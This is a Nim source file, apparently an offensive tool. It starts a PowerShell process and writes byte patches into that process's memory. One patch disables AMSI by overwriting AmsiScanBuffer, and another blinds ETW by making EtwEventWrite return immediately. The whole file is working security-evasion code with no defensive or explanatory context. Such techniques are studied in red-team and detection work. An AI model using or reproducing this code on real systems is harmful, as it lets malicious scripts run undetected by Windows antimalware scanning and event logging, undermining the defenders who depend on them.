import winim
import strformat
import Remote

when defined amd64:
    echo "[*] Running in x64 process"
    const patch: array[6, byte] = [byte 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3]
    const patch_etw: array[1, byte] = [byte 0xc3]
elif defined i386:
    echo "[*] Running in x86 process"
    const patch: array[8, byte] = [byte 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00]
    const patch_etw: array[4, byte] = [byte 0xc2, 0x14, 0x00, 0x00]

proc PatchAmsi(hProcss :HANDLE): bool =
    var disabled: bool = false
   
    var RemoteHandle = GetRemoteModuleHandle(hProcss, "amsi.dll")
    if RemoteHandle == 0:
        echo "[X] Failed to get amsi.dll handle"
        return disabled

    var RemoteProc = GetRemoteProcAddress(hProcss, RemoteHandle,"AmsiScanBuffer")
    if RemoteProc == NULL:
        echo "[X] Failed to get the address of 'AmsiScanBuffer'"
        return disabled

    if WriteProcessMemory(hProcss, RemoteProc, unsafeAddr patch, cast[SIZE_T](patch.len), NULL) == 0:
        echo "Failed to write process memory"
        return disabled
    else:
        disabled = true
    return disabled

proc PatchEtw(hProcess : HANDLE) : bool =
    var disabled: bool = false
    var RemoteHandle = GetRemoteModuleHandle(hProcess, "ntdll.dll")
    if RemoteHandle == 0:
        echo "[X] Failed to get ntdll.dll handle"
        return disabled

    var RemoteProc = GetRemoteProcAddress(hProcess, RemoteHandle,"EtwEventWrite")
    if RemoteProc == NULL:
        echo "[X] Failed to get the address of 'EtwEventWrite'"
        return disabled

    if WriteProcessMemory(hProcess, RemoteProc, unsafeAddr patch_etw, cast[SIZE_T](patch_etw.len), NULL) == 0:
        echo "Failed to write process memory"
        return disabled
    else:
        disabled = true
    return disabled

when isMainModule:
    var
        si : STARTUPINFO
        pi : PROCESS_INFORMATION
    if CreateProcess(NULL,"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, addr si, addr pi) == 0:
        echo "Failed to Create Powershell"
    else:
        echo "[*] Powershell started successfully" 
    var hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pi.dwProcessId) 
    Sleep(1000)
    var success = PatchAmsi(hProc)
    echo fmt"[*] AMSI disabled: {bool(success)}"
    var success2 = PatchEtw(hProc)
    echo fmt"[*] ETW blocked by patch: {bool(success2)}"